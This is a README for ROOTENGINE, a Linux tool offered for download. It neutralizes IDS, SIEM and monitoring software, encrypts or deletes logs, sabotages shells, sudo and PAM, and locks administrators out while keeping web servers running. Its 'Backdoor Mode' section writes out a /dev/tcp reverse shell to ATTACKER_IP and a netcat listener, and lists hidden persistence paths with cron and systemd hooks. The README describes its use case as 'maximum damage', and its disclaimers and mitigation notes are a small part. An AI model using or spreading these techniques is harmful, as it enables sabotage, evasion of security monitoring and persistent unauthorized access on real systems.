# ROOTENGINE

Advanced Linux system lockdown tool with security monitoring neutralization capabilities.

**Author:** @rafok2v9c

---

## DISCLAIMER

**THIS TOOL IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY.**

* This software is designed for use ONLY in controlled test environments, virtual machines, or systems where you have explicit authorization.
* The authors and contributors are NOT responsible for any damage, data loss, system failures, or legal consequences resulting from the use of this tool.
* Using this tool on systems without proper authorization may be ILLEGAL in your jurisdiction.
* By using this software, you accept FULL RESPONSIBILITY for your actions and any consequences that may arise.

**WARNING: This tool makes IRREVERSIBLE system modifications. Always create system snapshots before running.**

---

## Table of Contents

* [Overview](#overview)
* [Features](#features)
* [Compatibility](#compatibility)
* [Installation](#installation)
* [Usage](#usage)
* [Operating Modes](#operating-modes)
* [Technical Details](#technical-details)
* [Security Considerations](#security-considerations)
* [Legal Notice](#legal-notice)
* [Contributing](#contributing)
* [License](#license)

---

## Overview

ROOTENGINE is a sophisticated system lockdown tool that neutralizes security monitoring solutions while maintaining web service availability. It implements advanced techniques to restrict system access, disable security tools, and establish persistence mechanisms.

### Key Capabilities

* IDS/IPS neutralization (Snort, Suricata, Zeek, Fail2ban, etc.)
* SIEM/SOAR platform disruption (Splunk, Elastic Stack, QRadar, etc.)
* Monitoring tool shutdown (Nagios, Zabbix, Prometheus, Grafana, etc.)
* Log encryption and deletion
* Administrative access blocking (SSH, FTP, console)
* Web service preservation with aggressive protection
* Multiple persistence mechanisms

---

## Features

### Core Functionality

#### Security Tool Neutralization

* Stops and disables IDS/IPS systems
  * Snort
  * Suricata
  * Zeek (Bro)
  * Fail2ban
  * Tripwire
  * AIDE
  * Samhain

* Neutralizes SIEM platforms
  * Splunk
  * Elastic Stack (Elasticsearch, Logstash, Kibana, Beats)
  * IBM QRadar
  * ArcSight
  * LogRhythm
  * TheHive
  * Graylog
  * Security Onion
  * AlienVault OSSIM

* Disables monitoring agents
  * Nagios
  * Zabbix
  * Prometheus
  * Grafana
  * Datadog
  * New Relic

#### System Lockdown

* User account isolation (locks non-system users)
* Terminal device destruction (TTY/PTY disabled)
* System binary sabotage (shells, sudo, network tools)
* PAM authentication destruction
* Kernel parameter restrictions
* Resource limitations (cgroup)
* Filesystem restrictions

#### Web Server Protection

* Guaranteed uptime for Apache, Nginx, Lighttpd, PHP-FPM
* Real-time priority scheduling
* OOM killer protection
* Aggressive watchdog monitoring (5-second intervals)
* Automatic restart on failure
* Port monitoring (80/443)
* Process protection from system restrictions

#### Anti-Forensics

* System log encryption (AES-256-CBC with random keys)
* Log deletion fallback
* Shell history clearing
* Timestamp manipulation
* Audit trail removal
* Journal vacuum
* wtmp/btmp/lastlog clearing

#### Persistence (Backdoor Mode)

* Bash reverse shell backdoors
* Multiple hidden locations
  * `/.cache/.system/update.sh`
  * `/var/tmp/.x11/update.sh`
  * `/dev/shm/.config/update.sh`
* Crontab entries (every minute + @reboot)
* Systemd service creation
* Automatic restart mechanisms
* Watchdog protection

---

## Compatibility

### Supported Operating Systems

* Ubuntu (14.04+)
* Debian (8+)
* Fedora (20+)
* Linux Mint (17+)
* Arch Linux
* Manjaro
* openSUSE (Leap/Tumbleweed)
* Pop!_OS
* Kali Linux
* AlmaLinux (8+)

### Init System Support

* **systemd** (primary)
* **upstart** (legacy)
* **sysvinit** (legacy)

### Requirements

* Root/sudo access
* Bash 4.0+
* Standard Linux utilities (awk, sed, grep, pkill, etc.)
* Optional: openssl (for log encryption)
* Optional: chattr (for filesystem protection)

---

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/rootengine.git
cd rootengine

# Make executable
chmod +x rootengine.sh

# Verify integrity (optional)
sha256sum rootengine.sh
```

---

## Usage

### Basic Usage

```bash
# Show help
sudo ./rootengine.sh --help

# Run in interactive mode
sudo ./rootengine.sh
```

### Command Line Options

```
--help, -h          Show help message and exit
(no option)         Launch interactive menu
```

### Example Session

```bash
$ sudo ./rootengine.sh

██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝

Select execution mode:

1) Aggressive Mode - Maximum Lockdown
2) Backdoor Mode - Attacker Access Preserved

Enter your choice (1 or 2): _
```

---

## Operating Modes

### Mode 1: Aggressive (Maximum Lockdown)

Complete system lockdown with maximum restrictions.

#### Activated Features

* All security monitoring neutralization
* Complete user isolation
* Terminal destruction (TTY/PTY disabled)
* Binary sabotage (shells disabled)
* PAM authentication lockdown
* Kernel parameter restrictions
* Resource limitations
* Filesystem restrictions
* Display backlight disabled

#### Result

* System becomes completely locked down
* Only web services remain operational
* No interactive access possible
* All administrative channels blocked
* Console access disabled
* SSH service stopped
* System shells sabotaged
* Recovery tools neutralized

#### Use Case

Maximum damage scenario where attacker wants to completely lock out administrators while keeping web services visible.

---

### Mode 2: Backdoor (Attacker Access)

System lockdown while maintaining backdoor access for the attacker.

#### Activated Features

* Security monitoring neutralization
* Administrative access blocking (for legitimate users)
* Log encryption/deletion
* Web service protection
* SSH service disabled (for others)
* Console access blocked (for others)

#### Excluded Features (to preserve attacker access)

* User isolation (backdoor user preserved)
* Terminal destruction (attacker can use backdoor)
* Binary sabotage (attacker needs system tools)
* PAM destruction (backdoor authentication works)
* Kernel restrictions (flexibility for attacker)

#### Backdoor Mechanisms

**Reverse Shell:**
* Protocol: Bash built-in `/dev/tcp`
* Connection: `bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1`
* Reconnect interval: 60 seconds
* Hidden locations:
  * `/.cache/.system/update.sh`
  * `/var/tmp/.x11/update.sh`
  * `/dev/shm/.config/update.sh`

**Persistence Methods:**
* Crontab entry (executes every minute)
* @reboot crontab entry
* Systemd service (if systemd is available)
* Process watchdog (monitors and restarts)

**Configuration Required:**
* Attacker IP address
* Attacker listening port

**Listener Setup:**
```bash
# On attacker machine
nc -lvnp PORT
```

---

## Technical Details

### Architecture

#### Init System Detection

* Cached detection for performance optimization
* Automatic fallback: systemd → upstart → sysvinit
* Single detection on script start
* Supports hybrid systems

#### Service Management

* Universal service control abstraction
* Handles systemd, upstart, sysvinit seamlessly
* Checks service file existence before operations
* Silent error handling (2>/dev/null)

#### Process Protection Strategy

**Web Server Processes:**
* **Nice priority:** -20 (highest possible)
* **I/O priority:** RT (Real-time) Class 1, Level 0
* **CPU scheduling:** Real-time FIFO, priority 99
* **OOM score:** -1000 (never killed by OOM killer)
* **Freeze protection:** Disabled (process cannot be frozen)

**Protected Services:**
* apache2
* httpd
* nginx
* lighttpd
* php-fpm

#### Web Server Watchdog

**Monitoring:**
* Check interval: 5 seconds
* Services monitored: apache2, httpd, nginx, lighttpd, php-fpm
* Port monitoring: 80 (HTTP), 443 (HTTPS)

**Actions on Failure:**
* Immediate service restart (systemctl/service/init.d)
* Process priority reapplication
* OOM score adjustment
* I/O and CPU priority reset

**Persistence:**
* Script location: `/tmp/web_watchdog.sh`
* Execution: Background process (nohup)
* Systemd service: `web-watchdog.service` (if available)
* Auto-restart: Always enabled

---

### Security Mechanisms

#### Log Management

**Primary Method: Encryption**
* Algorithm: AES-256-CBC
* Key generation: `/dev/urandom` (32 bytes, base64 encoded)
* Fallback key: `date + $RANDOM + $$` (if urandom unavailable)
* Encrypted files: Original filename + `.enc` extension
* Original files: Deleted after encryption

**Fallback Method: Direct Deletion**
* Used if openssl is not available
* Complete removal of log files
* No recovery possible

**Targets:**
* `/var/log/*` (all log files)
* `/var/log/audit/*` (audit logs)
* `/var/log/messages`
* `/var/log/secure`
* `/var/log/auth.log`
* `/var/log/wtmp`, `/var/log/btmp`, `/var/log/lastlog`
* Systemd journal (vacuumed)
* Shell histories (bash, zsh)

**Additional Actions:**
* Logging services stopped (rsyslog, syslog-ng, systemd-journald, auditd)
* History variables unset (HISTFILE, HISTSIZE)
* HISTSIZE set to 0

---

#### Binary Sabotage

**Timing:**
* Shells disabled AFTER script completion (2-second delay)
* Prevents script from killing itself
* Separate background script handles shell sabotage

**Shell Neutralization:**
* bash, sh, dash, zsh
* Moved to: `<original>.disabled`
* Replaced with: `#!/bin/false` stub
* Permissions: 000 (no access)

**Tools Removed:**
* **sudo, su** (privilege escalation)
* **nc, netcat, telnet** (network tools)
* **ssh, scp, sftp** (remote access)
* **init, telinit** (system control)

**Tools Preserved (for web servers):**
* wget, curl (web server dependencies)
* systemctl, service (web server management)
* apache2, httpd, nginx, lighttpd, php-fpm binaries

---

#### Filesystem Protection

**Protected Directories (NEVER touched):**
* `/var/www/*`
* `/usr/share/nginx/*`
* `/srv/www/*`
* `/var/www/html/*`

**Modifications:**
* `/tmp` size: Limited to 10M (was 5M, increased for web uploads)
* `/tmp` options: nosuid, nodev (noexec removed for web server scripts)
* Inode exhaustion: 5000 files in `/tmp/.inode_fill/` (reduced from 10000)

**Immutability (chattr +i):**
* `/etc/passwd`
* `/etc/shadow`
* `/etc/group`
* `/etc/sudoers`
* `/etc/ssh/sshd_config`
* Web index files (if present)

**Root Directory Cleanup:**
* `.bash_history`, `.zsh_history` deleted
* `.ssh` directory removed
* Other files preserved (may contain web configs)

---

## Security Considerations

### Attack Surface

This tool intentionally creates severe security vulnerabilities:

* **Monitoring Blind:** All security monitoring disabled
* **No Logging:** Complete loss of audit trail
* **No Admin Access:** Legitimate administrators locked out
* **Broken Authentication:** PAM destroyed (Mode 1)
* **Persistent Backdoors:** Multiple hidden access points (Mode 2)
* **No Recovery:** System tools sabotaged

### Detection Methods

Despite neutralizing many security solutions, the tool CAN be detected through:

**Network Level:**
* Outbound connections to attacker IP (Mode 2)
* Unusual traffic patterns
* Missing heartbeats from monitoring agents
* SIEM/IDS alerts (if external/out-of-band)

**Physical Access:**
* Direct console access might work initially
* KVM/IPMI access
* Physical reset

**Hypervisor Level (for VMs):**
* Snapshot comparison
* Memory inspection
* Virtual disk analysis
* Hypervisor logging

**Out-of-Band Monitoring:**
* External log collectors
* Network-based IDS/IPS
* Physical security controls
* Secondary monitoring systems

### Mitigation (Defender Perspective)

**Preventive Measures:**
* Regular system snapshots/backups
* Mandatory out-of-band monitoring
* Physical security controls
* Network segmentation
* Least privilege principle
* Integrity monitoring (external)
* Read-only system partitions
* Immutable infrastructure

**Detection:**
* File integrity monitoring (external)
* Network traffic analysis
* Behavioral analysis
* Anomaly detection

**Response:**
* Restore from snapshot
* Rebuild from clean image
* Network isolation
* Forensic analysis (if logs preserved externally)

---

## Legal Notice

### IMPORTANT LEGAL WARNINGS

**1. Authorized Use Only**

This tool must ONLY be used on:
* Systems you own
* Systems where you have explicit written authorization to test
* Isolated test environments (VMs, lab networks)

**2. Criminal Liability**

Unauthorized use may constitute multiple criminal offenses:
* **Computer Fraud and Abuse Act (CFAA)** violations (United States)
* **Unauthorized access to computer systems** (various jurisdictions)
* **Computer sabotage and destruction of data**
* **Denial of service attacks**
* **Wiretapping** (for backdoor communications)
* **Identity theft** (if authentication is compromised)

**Penalties may include:**
* Heavy fines
* Prison sentences
* Civil liability
* Professional consequences

**3. Jurisdictional Considerations**

Laws vary significantly by country and region:
* United States: CFAA, state computer crime laws
* European Union: GDPR, Computer Misuse Act
* United Kingdom: Computer Misuse Act 1990
* Other regions: Local cybercrime legislation

**Always ensure compliance with ALL applicable laws.**

**4. No Warranty**

This software is provided "AS IS" without warranty of any kind, either expressed or implied, including but not limited to:
* Fitness for a particular purpose
* Merchantability
* Non-infringement
* Accuracy or reliability

**5. Limitation of Liability**

The authors and contributors assume NO LIABILITY for:
* Direct, indirect, incidental, or consequential damages
* Loss of data or system availability
* Legal consequences
* Financial losses
* Reputational damage
* Any other damages resulting from use or misuse

**BY USING THIS SOFTWARE, YOU ACCEPT FULL RESPONSIBILITY.**

---

### Ethical Use Guidelines

**DO:**
* Use only in isolated test environments
* Maintain comprehensive system backups
* Document all testing activities
* Obtain proper written authorization
* Follow responsible disclosure practices
* Respect laws and regulations
* Use for educational purposes
* Share findings with security community (responsibly)

**DO NOT:**
* Use on production systems
* Deploy without authorization
* Use for malicious purposes
* Distribute without disclaimer
* Remove safety mechanisms
* Use to harm others
* Violate laws or regulations
* Cause intentional damage

---

## Contributing

Contributions are welcome for legitimate purposes only.

### Accepted Contributions

* Bug fixes
* Compatibility improvements (new distros, init systems)
* Documentation enhancements
* Performance optimizations
* Code quality improvements
* Security improvements (defender perspective)

### NOT Accepted

* Features that increase malicious capabilities
* Removal of safety mechanisms
* Removal of warnings/disclaimers
* Anti-detection features
* Evasion techniques

### Reporting Issues

When reporting issues, please include:

* Operating system and version
* Init system type (systemd/upstart/sysvinit)
* Bash version
* Complete error messages
* Steps to reproduce
* Expected vs actual behavior

### Pull Request Guidelines

* Clear description of changes
* Testing on multiple distros (if applicable)
* Documentation updates
* Code comments for complex logic
* Maintain coding style consistency

---

## License

This project is released under [INSERT LICENSE HERE].

### Additional Restrictions

* May not be used for illegal purposes
* May not be deployed on production systems without authorization
* Must include all disclaimers and warnings
* Must not be modified to remove safety features
* Commercial use requires separate authorization

---

## Credits

**Author:** @rafok2v9c

**Special Thanks:**
* Linux kernel developers
* Security researcher community
* Open source security tool developers
* Bug reporters and contributors

**Inspiration:**
* Academic security research
* Penetration testing methodologies
* Red team operations research

---

## Changelog

### Version 1.0.0 (Current)

**Features:**
* Dual operating modes (Aggressive/Backdoor)
* Multi-distribution support (10+ Linux distros)
* Multi-init system support (systemd/upstart/sysvinit)
* Comprehensive security tool neutralization
* Advanced web server protection
* Log encryption with AES-256-CBC
* Multiple persistence mechanisms
* Anti-forensics capabilities
* Process protection (OOM, nice, ionice, chrt)
* Aggressive watchdog monitoring

**Improvements:**
* Race condition fixes (process killing)
* Performance optimization (init system caching)
* Cross-platform compatibility (/dev/urandom fallback)
* Enhanced error handling
* Web server protection guarantees

**Security:**
* Protected web server users from isolation
* Excluded web binaries from sabotage
* Prevented web directory modifications
* Fixed shell sabotage timing issue

---

## FAQ

**Q: Will this work on my system?**  
A: Check the compatibility section. It supports 10+ major Linux distributions.

**Q: Can this be detected?**  
A: Yes, through network monitoring, out-of-band systems, physical access, or hypervisor inspection.

**Q: Is this legal?**  
A: Only if used on systems you own or have explicit authorization to test. Otherwise, NO.

**Q: Can web servers crash?**  
A: Extremely unlikely. Multiple protection layers ensure web service availability.

**Q: How do I remove the backdoor?**  
A: Restore from snapshot or rebuild the system. Manual removal is complex.

**Q: What happens to my data?**  
A: Logs are encrypted or deleted. Other data is usually preserved.

**Q: Can I undo this?**  
A: In Mode 1, no (system is locked). In Mode 2, maybe (via backdoor). Best option: restore from backup.

---

## Support

For questions, issues, or discussions:

* Open an issue on GitHub
* Check existing documentation
* Review the source code (heavily commented)
* Read this README thoroughly

**Remember: This is a security research tool. Use responsibly and legally.**

---

## Disclaimer (Repeated for Emphasis)

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY.**

* Obtain written authorization before use
* Use only in isolated test environments
* Maintain complete backups
* Understand all legal implications
* Accept full responsibility
* Follow all applicable laws

**The authors are NOT responsible for misuse or consequences.**

---

**Project Status:** Active Development  
**Last Updated:** 2025-11-23  
**Version:** 1.0.0  
**Maintained by:** @rafok2v9c
